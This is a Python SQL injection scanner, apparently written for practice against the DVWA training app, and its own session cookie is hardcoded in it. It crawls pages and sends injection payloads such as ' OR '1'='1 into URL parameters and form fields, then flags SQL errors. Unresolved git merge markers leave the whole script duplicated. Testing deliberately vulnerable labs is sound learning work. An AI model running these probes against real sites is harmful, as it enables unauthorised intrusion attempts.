<<<<<<< HEAD
# scanner.py  (final, ready-to-run)
import time
import json
import argparse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from utils_old import get_session, find_sql_errors

# ----------------------------------------------------------
# adapter to your existing crawler
def crawl_and_extract_forms(start_url, max_pages=25):
    """Return forms list using SingleDomainCrawler."""
    from crawler import SingleDomainCrawler
    crawler = SingleDomainCrawler(start_url, max_pages=max_pages, delay=0.5)
    data = crawler.crawl()
    forms = []
    for page_url, page_forms in data["forms"].items():
        for f in page_forms:
            # keep only inputs that have a name attribute
            f["inputs"] = [inp for inp in f["inputs"] if inp.get("name")]
            forms.append(f)
    return forms

# ----------------------------------------------------------
class SQLiScanner:
    def __init__(self, delay=0.1):
        self.session = get_session()
        # --- DVWA session cookie ---
        self.session.headers.update({
            "Cookie": "PHPSESSID=01hr377u4lkib2aba5ufpusen4; security=low"
        })
        # --------------------------
        self.delay = delay
        self.findings = []

    def log(self, msg):
        print(f"[{time.strftime('%H:%M:%S')}] {msg}")

    def _send_and_check(self, url, param, payload, location,
                        method="GET", data=None):
        try:
            if method.upper() == "POST":
                resp = self.session.post(url, data=data, timeout=10)
            else:
                resp = self.session.get(url, params=data, timeout=10)
        except Exception as e:
            self.log(f"Network error on {url} → {e}")
            return

        found, pattern = find_sql_errors(resp.text)
        if found:
            self.log(f"SQL error detected at {location} param={param}")
            self.findings.append({
                "url": resp.url,
                "parameter": param,
                "payload": payload,
                "error_pattern": pattern
            })
        time.sleep(self.delay)

    def test_url_params(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return
        base = urlunparse(parsed._replace(query=""))
        for key in params:
            for payload in ["'", "' OR '1'='1", "' AND 1=0--"]:
                new_params = params.copy()
                new_params[key] = [payload]
                new_query = urlencode(new_params, doseq=True)
                final_url = f"{base}?{new_query}"
                self._send_and_check(final_url, key, payload, location="GET")

    def test_forms(self, forms):
        for form in forms:
            action = form["action"]
            method = form.get("method", "GET").upper()
            for inp in form["inputs"]:
                for payload in ["'", "' OR '1'='1", "' AND 1=0--"]:
                    data = {i["name"]: (i.get("value") or "test")
                            for i in form["inputs"]}
                    data[inp["name"]] = payload
                    self._send_and_check(action, inp["name"], payload,
                                         location="FORM",
                                         method=method, data=data)

    def run(self, start_url, crawl=False):
        self.log(f"Starting scan on {start_url}")
        self.test_url_params(start_url)
        if crawl:
            forms = crawl_and_extract_forms(start_url)
            self.test_forms(forms)
        self.log("Scan complete.")
        return self.findings

# ----------------------------------------------------------
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Lightweight SQLi scanner")
    parser.add_argument("--url", required=True, help="Target URL to start from")
    parser.add_argument("--crawl", action="store_true",
                        help="Spider and test forms")
    parser.add_argument("--delay", type=float, default=0.1,
                        help="Seconds between requests")
    args = parser.parse_args()

    scanner = SQLiScanner(delay=args.delay)
    results = scanner.run(args.url, crawl=args.crawl)
    print("\n=== RESULTS ===")
=======
# scanner.py  (final, ready-to-run)
import time
import json
import argparse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from utils_old import get_session, find_sql_errors

# ----------------------------------------------------------
# adapter to your existing crawler
def crawl_and_extract_forms(start_url, max_pages=25):
    """Return forms list using SingleDomainCrawler."""
    from crawler import SingleDomainCrawler
    crawler = SingleDomainCrawler(start_url, max_pages=max_pages, delay=0.5)
    data = crawler.crawl()
    forms = []
    for page_url, page_forms in data["forms"].items():
        for f in page_forms:
            # keep only inputs that have a name attribute
            f["inputs"] = [inp for inp in f["inputs"] if inp.get("name")]
            forms.append(f)
    return forms

# ----------------------------------------------------------
class SQLiScanner:
    def __init__(self, delay=0.1):
        self.session = get_session()
        # --- DVWA session cookie ---
        self.session.headers.update({
            "Cookie": "PHPSESSID=01hr377u4lkib2aba5ufpusen4; security=low"
        })
        # --------------------------
        self.delay = delay
        self.findings = []

    def log(self, msg):
        print(f"[{time.strftime('%H:%M:%S')}] {msg}")

    def _send_and_check(self, url, param, payload, location,
                        method="GET", data=None):
        try:
            if method.upper() == "POST":
                resp = self.session.post(url, data=data, timeout=10)
            else:
                resp = self.session.get(url, params=data, timeout=10)
        except Exception as e:
            self.log(f"Network error on {url} → {e}")
            return

        found, pattern = find_sql_errors(resp.text)
        if found:
            self.log(f"SQL error detected at {location} param={param}")
            self.findings.append({
                "url": resp.url,
                "parameter": param,
                "payload": payload,
                "error_pattern": pattern
            })
        time.sleep(self.delay)

    def test_url_params(self, url):
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            return
        base = urlunparse(parsed._replace(query=""))
        for key in params:
            for payload in ["'", "' OR '1'='1", "' AND 1=0--"]:
                new_params = params.copy()
                new_params[key] = [payload]
                new_query = urlencode(new_params, doseq=True)
                final_url = f"{base}?{new_query}"
                self._send_and_check(final_url, key, payload, location="GET")

    def test_forms(self, forms):
        for form in forms:
            action = form["action"]
            method = form.get("method", "GET").upper()
            for inp in form["inputs"]:
                for payload in ["'", "' OR '1'='1", "' AND 1=0--"]:
                    data = {i["name"]: (i.get("value") or "test")
                            for i in form["inputs"]}
                    data[inp["name"]] = payload
                    self._send_and_check(action, inp["name"], payload,
                                         location="FORM",
                                         method=method, data=data)

    def run(self, start_url, crawl=False):
        self.log(f"Starting scan on {start_url}")
        self.test_url_params(start_url)
        if crawl:
            forms = crawl_and_extract_forms(start_url)
            self.test_forms(forms)
        self.log("Scan complete.")
        return self.findings

# ----------------------------------------------------------
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Lightweight SQLi scanner")
    parser.add_argument("--url", required=True, help="Target URL to start from")
    parser.add_argument("--crawl", action="store_true",
                        help="Spider and test forms")
    parser.add_argument("--delay", type=float, default=0.1,
                        help="Seconds between requests")
    args = parser.parse_args()

    scanner = SQLiScanner(delay=args.delay)
    results = scanner.run(args.url, crawl=args.crawl)
    print("\n=== RESULTS ===")
>>>>>>> 7e5a228 (Add XSS scanner module and improve crawler and scanner)
    print(json.dumps(results, indent=2))